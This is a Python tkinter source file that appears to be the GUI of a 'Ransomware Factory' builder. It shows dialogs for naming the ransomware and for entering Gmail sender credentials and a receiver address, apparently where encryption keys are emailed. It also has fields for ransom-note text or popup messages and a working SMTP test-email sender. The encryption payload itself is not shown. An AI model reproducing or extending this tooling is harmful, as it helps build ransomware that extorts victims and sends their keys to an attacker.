# Getting Inports (tkinter, platform, os, smtplib, emails)
import tkinter as tk
import tkinter.font as tkFont
from tkinter import ttk
import platform
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import copy
from data import test_gui_message

class GUI:
    def __init__(self, main_file_name, window):
        # Getting File Data
        self.main_file_name = main_file_name

        # Getting Window
        self.window = window

    def create_text_popup(self, title, width, height, bg_color, text_color, label):
        # Create a new window
        popup = tk.Toplevel(self.window)
        popup.title(title)
        popup.configure(bg=bg_color)
        popup.resizable(False, False)

        # Set the window size
        popup.geometry(f"{width}x{height}")

        # Add a label to the popup window
        label = tk.Label(popup, text=label, bg=bg_color, fg=text_color, wraplength=width)
        label.pack(pady=20)

        # Add a button to close the popup window
        close_button = tk.Button(popup, text="Close", command=popup.destroy)
        close_button.pack()
        
    def create_info_popup(self, title, width, height, bg_color, text_color, sections):
        info_window = tk.Toplevel(self.window)
        info_window.title(title)
        info_window.configure(bg=bg_color)
        info_window.resizable(False, False)
        info_window.geometry(f"{width}x{height}")

        for section in sections:
            if section[0] is not None:
                section_title = tk.Label(info_window, text=section[0], bg=bg_color, fg=text_color, font=('Roboto Condensed', 16, 'bold'), justify='center', wraplength=width)
                section_title.pack(pady=5, side="top")

            if section[1] is not None:
                section_paragraph = tk.Label(info_window, text=section[1], bg=bg_color, fg=text_color, font=("Helvetica", 12), justify='center', wraplength=width)
                section_paragraph.pack(pady=10)

    def create_email_checker(self, bg_color, text_color):
        def send_test_email():
            try:
                # Create the email message
                message = MIMEMultipart()
                message["From"] = sender_email.get()
                message["To"] = receiver_email.get()
                message["Subject"] = "Test Email From Ransomware Factory"
                body = f"Testing the the email from \n\n sender_email \nWorked. If you got this, it did!"
                message.attach(MIMEText(body, "plain"))

                # Connect to the SMTP server and send the email
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(sender_email.get(), sender_password.get())
                    server.sendmail(sender_email.get(), receiver_email.get(), message.as_string())

                self.create_text_popup("Test Email Sender Notice", 400, 200, bg_color, text_color, "Test Email was sent!\nCheck the inbox or spam!")
            except Exception as e:
                self.create_text_popup("Test Email Sender Notice", 400, 200, bg_color, text_color, f"Failed to send email!\nMake sure the account has the permissions\nand check email & password!\nError: {e}")
        # Create a new window
        window = tk.Toplevel(self.window)
        window.title("Email Checker")
        window.configure(bg=bg_color)
        window.resizable(False, False)
        window.geometry("400x250")

        # Set up Input and Labels
        sender_email_label = tk.Label(window, text="Sender Email", font=('Roboto Condensed', 17, 'bold'), bg=bg_color, fg=text_color)
        sender_email_label.place(x=10, y=5, width=190, height=40)
        sender_email = tk.Entry(window, width=40)
        sender_email.place(x=10, y=35, width=190, height=25)

        sender_password_label = tk.Label(window, text="Sender Password", font=('Roboto Condensed', 17, 'bold'), bg=bg_color, fg=text_color)
        sender_password_label.place(x=10, y=65, width=190, height=40)
        sender_password = tk.Entry(window, width=40)
        sender_password.place(x=10, y=95, width=190, height=25)

        receiver_email_label = tk.Label(window, text="Receiver Email", font=('Roboto Condensed', 17, 'bold'), bg=bg_color, fg=text_color)
        receiver_email_label.place(x=10, y=165, width=190, height=40)
        receiver_email = tk.Entry(window, width=40)
        receiver_email.place(x=10, y=195, width=190, height=25)

        # Setting Up sender button
        send_button = tk.Button(window, text="Send Test Email", command=send_test_email)
        send_button.place(x=240, y=20, height=50, width=120)

    def args_popup(self, window, profile, bg_color, text_color):
        # Setting Up exit
        return_bool = True
        return_value = copy.deepcopy(profile)
        def close_window():
            nonlocal return_bool
            return_bool = False
            get_args()
            root.destroy()
        def end_values():
            get_args()
            root.destroy()

        def get_args():
            return_value.file_name = file_name_entry.get()
            return_value.project_name = project_name_entry.get()
            # Fixing Email Vars
            if profile.storage_method == "Email":
                return_value.from_email = sender_email_entry.get()
                return_value.from_password = sender_password_entry.get()
                return_value.to_email = receiver_email_entry.get()
            else:
                return_value.from_email = ""
                return_value.from_passoword = ""
                return_value.to_password = ""
            # Fixing Text File Vars
            if profile.message_type == "Text File":
                return_value.text_file = text_file_entry.get("1.0", "end-1c")
            elif profile.message_type == "GUI Popup":
                return_value.GUI_message[0] = self.text_1.get("1.0", "end-1c")
                return_value.GUI_message[1] = self.text_2.get("1.0", "end-1c")
                return_value.GUI_message[2] = self.text_3.get("1.0", "end-1c")
                return_value.GUI_message[3] = self.text_4.get("1.0", "end-1c")
                return_value.GUI_message[4] = self.text_5.get("1.0", "end-1c")
                print(return_value.GUI_message)
            else:
                return_value.text_file = "R\\n\\tA\\n\\t\\tN\\n\\t\\t\\tS\\n\\t\\t\\t\\tO\\n\\t\\t\\t\\t\\tM\\n>:3"

        # Create a new window
        root = tk.Toplevel(window)
        root.title("Create Ransomware")
        root.configure(bg=bg_color)
        root.resizable(False, False)
        root.protocol("WM_DELETE_WINDOW", close_window)

        # Set the window size
        root.geometry("650x500")

        # Adding Project Name and File Name Frame & text boxes
        name_frame = tk.Frame(root, bg=bg_color)
        name_frame.place(x=0, y=0, width=650, height=150)

        popup_title = tk.Label(name_frame, text="Final Options", bg=bg_color, fg=text_color, font=('Roboto Condensed', 27, 'bold'))
        popup_title.pack(pady=10)

        file_name_label = tk.Label(name_frame, text="Enter File Name", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
        file_name_label.place(x=0, y=70, width=325, height=40)
        project_name_label = tk.Label(name_frame, text="Enter Project Name", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
        project_name_label.place(x=325, y=70, width=325, height=40)

        file_name_entry = tk.Entry(name_frame, font=("Helvetica", 14))
        file_name_entry.place(x=30, y=110, width=275, height=30)
        project_name_entry = tk.Entry(name_frame, font=("Helvetica", 14))
        project_name_entry.place(x=345, y=110, width=275, height=30)

        # Getting Email Key Data
        email_frame = tk.Frame(root, bg=bg_color)
        email_frame.place(x=0, y=150, height=350, width=325)
        if profile.storage_method == "Email":
            sender_email_label = tk.Label(email_frame, text="Enter Sender Email", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
            sender_email_label.pack(pady=10)
            sender_email_entry = tk.Entry(email_frame, font=("Helvetica", 14))
            sender_email_entry.pack(pady=10)

            sender_password_label = tk.Label(email_frame, text="Enter Sender Password", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
            sender_password_label.pack(pady=10)
            sender_password_entry = tk.Entry(email_frame, font=("Helvetica", 14))
            sender_password_entry.pack(pady=10)

            receiver_email_label = tk.Label(email_frame, text="Enter Receiver Email", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
            receiver_email_label.pack(pady=10)
            receiver_email_entry = tk.Entry(email_frame, font=("Helvetica", 14))
            receiver_email_entry.pack(pady=10)
        else:
            email_not_needed = tk.Label(email_frame, text="Email Segment Not Needed for Current Ransomware.", bg=bg_color, fg=text_color, font=('Roboto Condensed', 23), wraplength=325)
            email_not_needed.place(x=0, y=0, width=325, height=350)

        # Getting Message
        message_frame = tk.Frame(root, bg=bg_color)
        message_frame.place(x=325, y=150, height=350, width=325)
        if profile.message_type == "Text File":
            text_file_label = tk.Label(message_frame, text="Type what to put in the text file", bg=bg_color, fg=text_color, font=('Roboto Condensed', 17))
            text_file_label.pack(pady=10)
            text_file_entry = tk.Text(message_frame, font=("Helvetica", 14), wrap="word")
            text_file_entry.place(x=10, y=55, width=290, height=240)
        elif profile.message_type == "GUI Popup":
            # Setting Up GUI Type, And Tester
            def test_gui():
                return_value.GUI_message[0] = self.text_1.get("1.0", "end-1c")
                return_value.GUI_message[1] = self.text_2.get("1.0", "end-1c")
                return_value.GUI_message[2] = self.text_3.get("1.0", "end-1c")
                return_value.GUI_message[3] = self.text_4.get("1.0", "end-1c")
                return_value.GUI_message[4] = self.text_5.get("1.0", "end-1c")
                test_gui_message(return_value.GUI_message, return_value.GUI_type, self.window)
            gui_test = tk.Button(message_frame, text="Test Window", command= test_gui)#lambda: test_gui_message(return_value.GUI_message, return_value.GUI_type))
            gui_test.place(x=200, y=50, width=100, height=35)
            gui_type_label = tk.Label(message_frame, text="What GUI Type do you want:", bg=bg_color, fg=text_color, font=("Helvetica", 14))
            gui_type_label.place(x=0, y=10, width=255, height=35)
            GUI_types = ["1", "2", "3", "4"]
            current_gui_type = tk.StringVar(value=GUI_types[0])
            gui_selection = tk.OptionMenu(message_frame, current_gui_type, *GUI_types)
            gui_selection.config(fg=text_color, font=("Helvetica", 14))
            gui_selection.place(x=250, y=10, width=50, height=35) 
            def on_gui_selection(*args):
                value = int(current_gui_type.get())
                return_value.GUI_type = value
            current_gui_type.trace("w", on_gui_selection)
            # Setting Up Text Boxes
            text_label = tk.Label(message_frame, bg=bg_color, fg=text_color, font=("Helvetica", 14), text="Texts 1-4 for the GUI.")
            text_label.pack(pady=90)
            self.text_1 = tk.Text(message_frame, font=("Helvetica", 12))
            self.text_1.place(x=20, y=120, width=285, height=30)
            self.text_1.insert("1.0", "Text 1")
            self.text_2 = tk.Text(message_frame, font=("Helvetica", 12))
            self.text_2.place(x=20, y=155, width=285, height=30)
            self.text_2.insert("1.0", "Text 2")
            self.text_3 = tk.Text(message_frame, font=("Helvetica", 12))
            self.text_3.place(x=20, y=190, width=285, height=30)
            self.text_3.insert("1.0", "Text 3")
            self.text_4 = tk.Text(message_frame, font=("Helvetica", 12))
            self.text_4.place(x=20, y=225, width=285, height=30)
            self.text_4.insert("1.0", "Text 4")
            self.text_5 = tk.Text(message_frame, font=("Helvetica", 12))
            self.text_5.place(x=20, y=260, width=285, height=30)
            self.text_5.insert("1.0", "https://www.google.com/")

        
        else:
            message_not_needed = tk.Label(message_frame, text="Message Segment Not Needed for Current Ransomware.", bg=bg_color, fg=text_color, font=('Roboto Condensed', 23), wraplength=325)
            message_not_needed.place(x=0, y=0, width=325, height=350)

        # Getting Input Button
        finish_button = tk.Button(root, text="Finish", font=("Helvetica", 14, "bold"), command=end_values)
        finish_button.place(x=250, y=455, width=150, height=40)

        # Stopping Create from going without window being done
        print("Waiting")
        root.wait_window()
        print("No Longer Waiting")
        return return_value, return_bool